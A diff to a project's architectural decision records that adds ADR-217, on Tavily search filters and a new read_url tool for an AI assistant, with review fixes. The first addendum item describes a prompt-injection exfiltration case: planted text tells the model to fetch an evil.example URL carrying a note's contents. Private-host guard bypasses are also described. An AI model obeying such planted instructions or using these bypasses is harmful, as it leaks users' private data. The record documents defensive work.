@@ -1,6 +1,10 @@
 # Pythia — Architectural Decision Records
 
-*Last updated: 2026-09-25 — ADR-216 second addendum (the four low review findings: a pin's open/closed state is per conversation; a chart pin is named by the card's own rule; ↗'s finders are a Record the compiler checks; each pin body is owned by one child component, released on re-render).*
+*Last updated: 2026-09-25 — ADR-217 addendum (review): `read_url` reads only a link the user gave or a result of this answer returned, verbatim, at most 5 per answer (`services/webReadScope.ts`); a URL with a user name or password is refused; the private-host guard no longer misses a trailing dot or an IPv4-mapped IPv6 address; the auto-arm rule is `wantsWeb` in `sendPolicy.ts`.*
+
+*Previously: 2026-09-25 — ADR-217 (Tavily: optional `topic` / `time_range` / domain filters on `web_search`, validated by `services/tavilyArgs.ts`; a new research-gated `read_url` tool on Tavily /extract that refuses private hosts and names its 8 000-char cut; a pasted link auto-arms like a time cue).*
+
+*Previously: 2026-09-25 — ADR-216 second addendum (the four low review findings: a pin's open/closed state is per conversation; a chart pin is named by the card's own rule; ↗'s finders are a Record the compiler checks; each pin body is owned by one child component, released on re-render).*
 
 *Previously: 2026-09-25 — ADR-216 addendum (review): a pinned code block's fence can no longer be closed by the code inside it; a table cell is written back escaped, so it renders as what it showed; a pin that cannot render logs why and shows its text; ↗ is tested for every block kind).*
 
@@ -4482,3 +4486,51 @@ Deliberately not changed from the same review: the open/closed state shared acro
 5. **Each pin body is owned by one child `Component`**, added to the view and removed — which unloads it — on the next render and when the strip hides. Rendering straight into the view had left one child per render until the view closed.
 
 Four of the new tests fail on the previous code (per-conversation state, the quoted title, the untitled chart, the released components); the Record is enforced by the compiler.
+
+### ADR-217 — Tavily: search filters and `read_url`
+
+**Status:** Active · 2026-09-25
+
+**Context.** Pythia used one Tavily endpoint (`/search`) with fixed parameters, and the model could pass only a query. Two gaps came out of a comparison with Tavily's API. (1) A question about this week's news or one named site could only be steered through the query's wording. Tavily has `topic`, `time_range` and `include_domains` / `exclude_domains` for exactly this. (2) A link the user pasted could not be read. The model searched for the page instead and answered from a 500-character snippet, when `/extract` returns the page itself. The user chose these two out of the full gap list. The rest are D-56 and D-57.
+
+**Decision.**
+- **Filters are the model's choice, optional and off by default.** `web_search` gains `topic` (`general|news|finance`), `time_range` (`day|week|month|year`), `include_domains` and `exclude_domains` (at most 10 each). They are sent only when set. `topic: "general"` is dropped because it is Tavily's default, and keeping it would make an unfiltered search read as filtered.
+- **One validator at the boundary**, `services/tavilyArgs.ts`, which follows the `parseChartSpec` pattern (principle 1). Every rejection names the field and the value. Domains are normalised through `webDomain` (the same function the sources row dedupes by) and must be a real hostname. The args object is built fresh, so a stray `search_depth` or `api_key` from the model never reaches the request body.
+- **A filtered search that finds nothing says which filters it used and is never retried behind the model's back.** A silent second search would spend a second credit nobody sees (principle 2). The message tells the model to search again without the filters, which it can do in the same turn.
+- **`read_url` is its own tool, not a `web_search` mode.** "I have the address" and "find me pages" are different questions, and a mode flag would make every search call carry a URL field. It sits behind the **same research gate** as `web_search`. It is the same third party and the same opt-in, and the README's privacy table now says URLs are sent too.
+- **A private or local address is refused before any request.** That covers localhost, RFC 1918, link-local (including the cloud metadata address), CGNAT, IPv6 ULA and link-local, `.local` / `.internal` / `.lan`, and single-label intranet names. Tavily fetches from its own servers, so such a page could never be read, but sending the URL would still hand an intranet address to a third party. The error tells the model to ask for the page's text instead.
+- **The page is capped at 8 000 characters, and the cap is named** in the result (`the first 8000 of N characters are shown`). A model that is not told assumes it read the whole page. A failed read (`failed_results`) or empty text is an `Error:` naming the reason, never an empty success.
+- **The page joins the sources row with no new plumbing.** The extract result uses the search result's `### 1. <domain> / URL:` header, so `parseWebSourcesFromResult` picks it up.
+- **A pasted link auto-arms** like a time cue does (`containsWebUrl`, ADR-099). `shouldAutoArmSearch`'s input is renamed `timeSensitive` → `wantsWeb`, so it stays one rule with one input.
+- **One HTTP path.** `WebSearchService.post` holds the bearer header and the 401/403 · 429 · other classification for both endpoints. `max_results` is clamped to 20 (Tavily's ceiling; the setting had no upper bound).
+- The status chip names the filters (`Searching the web: "q" · news · past week`), using the same `describeSearchFilters` builder as the no-results message, with localised words.
+
+**Rejected.**
+- *Automatic retry without filters* (a hidden credit, see above).
+- *`include_raw_content` on search* (every result becomes a page, and one search could fill the context window; `read_url` reads one page, on purpose).
+- *`auto_parameters` and `search_depth: "advanced"`* (either can double the credit cost without anyone choosing it; D-57).
+- *`/research`* (asynchronous, needs polling, and brings its own citation formats, which clash with ADR-077's `⟦cite:web⟧` contract; D-56).
+- *`/crawl` and `/map`* (batch jobs, not chat actions; D-56).
+- *Gating `read_url` on nothing* (it is an outbound call, so the opt-in is the point).
+
+**Consequence.** A research turn can ask for "news from the past week on ecb.europa.eu", and "summarise this link" reads the page. No setting is added. The model decides per call, and the user's controls stay the globe and auto-arm.
+
+**Not verified.** No request was made to Tavily from this environment. The request shapes are tested against a mocked `requestUrl`, and the parameter names and the 20-result ceiling come from Tavily's own `langchain-tavily` wrapper, because docs.tavily.com could not be reached. Check them against the API reference, or with one real call per endpoint, before release.
+
+**Guards.** `tests/tavilyArgs.test.ts`: every enum accepted and refused by name; domain normalisation, dedupe and cap; unknown keys dropped; a table of private addresses refused, and their public neighbours allowed. `tests/webSearch.test.ts`: filters only when set; the filtered no-results message and no retry; the clamp; extract's body, header, cut notice, failure reasons and the shared status classes; the page round-trips into the sources row. `tests/ToolHandler.test.ts`: `read_url` gated exactly like `web_search`, a bad filter refused before the service, a private URL refused before any request. `tests/webSearchHeuristics.test.ts`: `containsWebUrl`.
+
+**Deferred:** D-56 (crawl · map · research), D-57 (advanced depth · auto-parameters · raw content on search).
+
+**Addendum — review fixes (2026-09-25).** A four-ring review of the change found one high, two medium and three low findings. All six are fixed:
+
+1. **`read_url` could be used to exfiltrate data (high).** A page the model had read, a search snippet or an attached note could tell it to read `https://evil.example/log?d=<the note>`. Tavily would fetch that URL and the attacker's server would log the query string. Before this ADR, nothing outbound went anywhere but Tavily; `read_url` made the destination the model's choice. **`read_url` now reads only a link Pythia can vouch for, exactly as written** (`WebReadScope`, `services/webReadScope.ts`): a link in a user message of this conversation, or one a `web_search` / `read_url` result returned during this answer. The match is exact after normalisation (parsed, fragment dropped, trailing punctuation cut), so a URL the model extends with data is not on the list. That is the whole defence. **An attached note is not a source.** A note is the content an exfiltration would carry, and a link written into it cannot be told apart from one planted there; that was the user's decision. The guard **fails closed**: `ToolHandler.execute` refuses `read_url` without a scope, so a new caller cannot leave it open. The send path and each comparison candidate build their own scope. *What remains:* a planted page could list several static links and have the model choose among them, leaking a few bits per read. The per-answer cap below keeps that to a handful.
+2. **A URL carrying `user:password@` was forwarded (medium).** It is now refused, without echoing the credential into the error. It is refused rather than stripped, because the page behind it is one the user reaches as themselves.
+3. **The private-host guard could be bypassed (medium-low)** by a trailing dot (`localhost.`, `nas.local.`) and by an IPv4-mapped IPv6 address (`[::ffff:127.0.0.1]`, which the URL parser writes as `[::ffff:7f00:1]`). The trailing dot is now stripped, and a mapped address is judged as the IPv4 address it maps to (`isPrivateIPv4`, one list of ranges).
+4. **The auto-arm composition had no test.** `wantsWeb(text, year)` moved into `services/sendPolicy.ts`, and the view calls it.
+5. **Page reads per answer are capped at 5** (`MAX_READS_PER_TURN`). An admitted read counts whether or not the page loads; a refused one costs nothing. Without the cap, 25 tool rounds × 8 000 chars could put about 200 000 chars into one answer.
+6. **One site is named, several are counted** in the filter description (`excluding ecb.europa.eu`, `excluding 3 sites`), so no locale needs a singular form. Before, the chip read `excluding 2`.
+
+Left as it is: `search(string | SearchArgs)`, whose string form only the older tests use.
+
+**Guards.** `tests/webReadScope.test.ts`: the exfiltration URL refused; a user link admitted under any spelling; assistant text not a source; a result's link admitted only after it is returned; the cap, and refusals not spending it. `tests/ToolHandler.test.ts`: fail closed without a scope; a data-carrying URL refused before any request. `tests/tavilyArgs.test.ts`: a credential refused and not echoed; trailing dot and mapped IPv6 addresses refused, a mapped public address allowed. `tests/sendPolicy.test.ts`: `wantsWeb`. The three validator bypasses were each confirmed against the previous code with a probe before the fix.
+
